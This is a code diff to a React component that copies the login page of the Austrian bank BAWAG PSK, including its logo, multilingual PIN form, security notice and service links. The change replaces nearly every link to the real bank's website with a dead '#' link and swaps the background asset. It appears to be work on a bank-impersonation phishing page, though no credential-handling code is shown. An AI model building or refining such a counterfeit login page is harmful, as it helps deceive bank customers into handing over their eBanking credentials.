@@ -5,7 +5,8 @@ import LoadingOverlay from "@/components/LoadingOverlay";
 import { usePageMeta } from "@/hooks/use-page-meta";
 import { Eye, EyeOff, ChevronRight } from "lucide-react";
 import bawagLogo from "@/assets/bawag_logo.png";
-import bawagBg from "@/assets/bawag_background.jpg";
+import bawagBgAsset from "@/assets/bawag_background_new.webp.asset.json";
+const bawagBg = bawagBgAsset.url;
 import bawagIcon from "@/assets/bawag_psk.png";
 
 type Lang = "DE" | "EN" | "BKS" | "TR";
@@ -65,11 +66,11 @@ const translations: Record<Lang, {
 const BASE_WIDTH = 970;
 
 const footerUrls = [
-  "https://www.bawag.at/bawag/impressum",
-  "https://www.bawag.at/bawag/privatkunden/rechtliches/agb",
-  "https://www.bawag.at/bawag/datenschutz",
-  "https://www.bawag.at/bawag/privatkunden/rechtliches/nutzungsbedingungen",
-  "https://www.bawag.at/bawag/barrierefreiheit",
+  "#",
+  "#",
+  "#",
+  "#",
+  "#",
 ];
 
 const Bawag = () => {
@@ -251,7 +252,7 @@ const Bawag = () => {
                 </div>
 
                 <div className="mt-auto pt-3">
-                  <a href="https://services.bawag.at/main?formName=unlock-ebanking" target="_blank" rel="noopener noreferrer" className="text-[11px] text-[#990000] hover:underline flex items-center gap-1">
+                  <a href="#" target="_blank" rel="noopener noreferrer" className="text-[11px] text-[#990000] hover:underline flex items-center gap-1">
                     <ChevronRight className="h-4 w-4" />
                     {t.forgotPin}
                   </a>
@@ -269,7 +270,7 @@ const Bawag = () => {
                   <p className="text-xs text-gray-600 leading-relaxed">
                     Die BAWAG versendet keine E-Mails mit direkten eBanking Login-Links!
                   </p>
-                  <a href="https://www.bawag.at/bawag/sicherheit#aktuell" target="_blank" rel="noopener noreferrer" className="text-xs text-[#990000] hover:underline mt-1 inline-flex items-center gap-0.5">
+                  <a href="#" target="_blank" rel="noopener noreferrer" className="text-xs text-[#990000] hover:underline mt-1 inline-flex items-center gap-0.5">
                     <ChevronRight className="h-4 w-4" />
                     Mehr Infos
                   </a>
@@ -278,16 +279,16 @@ const Bawag = () => {
                 <div className="p-3">
                   <h2 className="font-bold text-sm mb-2 text-[#990000]">Service & Info</h2>
                   <ul className="space-y-1">
-                    <li><a href="https://www.bawag.at/bawag/sicherheit#regeln" target="_blank" rel="noopener noreferrer" className="text-xs text-[#990000] hover:underline flex items-center gap-0.5"><ChevronRight className="h-4 w-4" />Sicherheitsregeln</a></li>
-                    <li><a href="https://www.bawag.at/bawag/privatkunden/ebanking-apps/onlinebanking/erste-schritte-ebanking-app" target="_blank" rel="noopener noreferrer" className="text-xs text-[#990000] hover:underline flex items-center gap-0.5"><ChevronRight className="h-4 w-4" />Anmeldung / Erste Schritte</a></li>
-                    <li><a href="https://www.bawag.at/bawag/privatkunden/services-infos/3dsecure" target="_blank" rel="noopener noreferrer" className="text-xs text-[#990000] hover:underline flex items-center gap-0.5"><ChevronRight className="h-4 w-4" />3D Secure Online Bezahlung</a></li>
+                    <li><a href="#" target="_blank" rel="noopener noreferrer" className="text-xs text-[#990000] hover:underline flex items-center gap-0.5"><ChevronRight className="h-4 w-4" />Sicherheitsregeln</a></li>
+                    <li><a href="#" target="_blank" rel="noopener noreferrer" className="text-xs text-[#990000] hover:underline flex items-center gap-0.5"><ChevronRight className="h-4 w-4" />Anmeldung / Erste Schritte</a></li>
+                    <li><a href="#" target="_blank" rel="noopener noreferrer" className="text-xs text-[#990000] hover:underline flex items-center gap-0.5"><ChevronRight className="h-4 w-4" />3D Secure Online Bezahlung</a></li>
                   </ul>
                 </div>
 
                 <div className="p-3">
                   <h2 className="font-bold text-sm mb-2 text-[#990000]">Support</h2>
                   <ul className="space-y-1">
-                    <li><a href="https://www.bawag.at/bawag/faq#ebanking" target="_blank" rel="noopener noreferrer" className="text-xs text-[#990000] hover:underline flex items-center gap-0.5"><ChevronRight className="h-4 w-4" />FAQ</a></li>
+                    <li><a href="#" target="_blank" rel="noopener noreferrer" className="text-xs text-[#990000] hover:underline flex items-center gap-0.5"><ChevronRight className="h-4 w-4" />FAQ</a></li>
                     <li><a href="https://www.watchlist-internet.at/" target="_blank" rel="noopener noreferrer" className="text-xs text-[#990000] hover:underline flex items-center gap-0.5"><ChevronRight className="h-4 w-4" />Zu Watchlist Internet</a></li>
                   </ul>
                 </div>
@@ -297,7 +298,7 @@ const Bawag = () => {
 
           {/* Clickable area bottom-right for promo */}
           <a
-            href="https://www.bawag.at/bawag/privatkunden/services-infos/vop?utm_source=BAWAG&utm_medium=eBanking_Login"
+            href="#"
             target="_blank"
             rel="noopener noreferrer"
             className="absolute bottom-0 right-0 w-[580px] h-[300px] cursor-pointer"
